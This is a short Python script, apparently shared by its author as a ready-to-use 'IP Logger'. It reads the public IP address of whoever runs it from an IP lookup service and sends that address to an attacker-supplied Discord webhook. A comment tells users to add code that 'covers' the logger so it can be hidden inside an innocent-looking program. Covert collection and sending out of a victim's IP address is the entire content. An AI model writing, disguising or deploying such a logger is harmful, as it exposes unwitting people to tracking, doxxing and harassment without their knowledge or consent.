#Made by: Matty#8952
#Github: MattyTM
#Discord server: https://discord.gg/CJWW7DW
import requests
import discord_webhook
import socket
from discord_webhook import DiscordWebhook, DiscordEmbed

ip = 'https://api.ipify.org/' 
output = requests.get(ip).text

webhook = DiscordWebhook(url='YOUR WEBHOOK')
embed = DiscordEmbed(title='New registered ip', description=output, color=65280)
embed.set_author(name='IP Logger', url='https://github.com/MattyTM', icon_url='https://cdn.icon-icons.com/icons2/260/PNG/64/ip_29250.png')
embed.set_footer(text='Credits: Matty#8952')
embed.set_timestamp()
webhook.add_embed(embed)
response = webhook.execute()

#Here you can add your code to "cover" the ip logger

#Enjoy and dont do illegal things with this!